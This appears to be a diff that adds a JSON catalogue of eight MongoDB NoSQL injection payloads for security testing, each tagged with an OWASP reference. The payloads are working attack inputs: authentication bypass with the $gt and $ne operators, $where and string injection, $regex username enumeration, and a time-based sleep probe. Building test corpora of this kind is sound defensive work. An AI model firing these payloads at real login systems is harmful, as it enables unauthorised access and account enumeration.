@@ -1,0 +1,82 @@
+[
+  {
+    "id": "nosql-001",
+    "family": "nosql",
+    "subtype": "mongodb_operator",
+    "payload_string": "{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}",
+    "context": "json",
+    "description": "MongoDB authentication bypass using $gt operator",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_NoSQL_Injection"],
+    "platform_specific": {"mongodb": true}
+  },
+  {
+    "id": "nosql-002",
+    "family": "nosql",
+    "subtype": "mongodb_operator",
+    "payload_string": "{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}",
+    "context": "json",
+    "description": "MongoDB authentication bypass using $ne operator",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_NoSQL_Injection"],
+    "platform_specific": {"mongodb": true}
+  },
+  {
+    "id": "nosql-003",
+    "family": "nosql",
+    "subtype": "mongodb_operator",
+    "payload_string": "{\"$where\":\"this.password==this.username\"}",
+    "context": "json",
+    "description": "MongoDB injection using $where clause",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_NoSQL_Injection"],
+    "platform_specific": {"mongodb": true}
+  },
+  {
+    "id": "nosql-004",
+    "family": "nosql",
+    "subtype": "mongodb_operator",
+    "payload_string": "{\"username\":{\"$regex\":\"^admin\"},\"password\":{\"$ne\":\"\"}}",
+    "context": "json",
+    "description": "MongoDB injection using $regex for username enumeration",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_NoSQL_Injection"],
+    "platform_specific": {"mongodb": true}
+  },
+  {
+    "id": "nosql-005",
+    "family": "nosql",
+    "subtype": "mongodb_operator",
+    "payload_string": "{\"$or\":[{\"username\":\"admin\"},{\"username\":\"administrator\"}]}",
+    "context": "json",
+    "description": "MongoDB injection using $or operator for multiple conditions",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_NoSQL_Injection"],
+    "platform_specific": {"mongodb": true}
+  },
+  {
+    "id": "nosql-006",
+    "family": "nosql",
+    "subtype": "mongodb_injection",
+    "payload_string": "admin' || '1'=='1",
+    "context": "string",
+    "description": "NoSQL string injection bypass for MongoDB",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_NoSQL_Injection"],
+    "platform_specific": {"mongodb": true}
+  },
+  {
+    "id": "nosql-007",
+    "family": "nosql",
+    "subtype": "mongodb_operator",
+    "payload_string": "{\"email\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
+    "context": "json",
+    "description": "MongoDB injection bypassing both email and password checks",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_NoSQL_Injection"],
+    "platform_specific": {"mongodb": true}
+  },
+  {
+    "id": "nosql-008",
+    "family": "nosql",
+    "subtype": "mongodb_operator",
+    "payload_string": "{\"$where\":\"sleep(5000)\"}",
+    "context": "json",
+    "description": "MongoDB time-based blind injection via $where with sleep",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_NoSQL_Injection"],
+    "platform_specific": {"mongodb": true}
+  }
+]
